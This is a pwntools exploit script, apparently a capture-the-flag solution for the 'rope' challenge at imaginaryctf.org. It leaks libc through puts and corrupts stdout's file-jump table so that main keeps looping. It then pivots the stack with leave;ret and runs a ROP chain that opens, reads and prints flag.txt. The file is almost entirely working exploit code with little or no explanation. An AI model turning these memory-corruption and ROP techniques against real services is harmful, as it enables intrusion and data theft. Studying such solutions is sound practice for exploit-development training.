#!/usr/bin/python3

from pwn import *

exe = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
context.binary = exe
context.log_level = 'info'

# p = process(exe.path)
p = remote('rope.chal.imaginaryctf.org', 1337)

##################################
### Stage 1: Make loop of main ###
##################################
p.recvuntil(b'0x')
libc.address = int(p.recvline()[:-1], 16) - libc.sym['puts']
log.info(hex(libc.address))
stdout = libc.address + 0x3c5620
stdout_IO_file_jumps = stdout + 0xd8

payload = p64(exe.sym['main'] + 54)
p.sendline(payload)
p.sendline(f'{stdout_IO_file_jumps}'.encode())
p.sendline(f'{exe.sym["inp"]-0x38}'.encode())

#######################################
### Stage 2: Stack pivot & ROPchain ###
#######################################
payload = p64(exe.sym['main'] + 54)
p.sendline(payload)
p.sendline(f'{stdout}'.encode())
p.sendline(f'{exe.sym["inp"]}'.encode())

leave_ret = 0x00000000004013bc
pop_rax = 0x000000000003a738 + libc.address
pop_rdi = 0x0000000000021112 + libc.address
pop_rsi = 0x00000000000202f8 + libc.address
pop_rdx = 0x0000000000001b92 + libc.address
syscall = 0x00000000000bc3f5 + libc.address
rop = flat(
    pop_rax, 2,
    pop_rdi, 0x4040e0,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,

    pop_rdi, 3,
    pop_rsi, 0x404a00,
    pop_rdx, 0x100,
    libc.sym['read'],

    pop_rdi, 1,
    libc.sym['write'],
    b'flag.txt\x00'
    )
payload = p64(leave_ret) + rop
p.sendline(payload)
p.sendline(f'{stdout + 0x8}'.encode())
p.sendline(f'{leave_ret}'.encode())

p.interactive()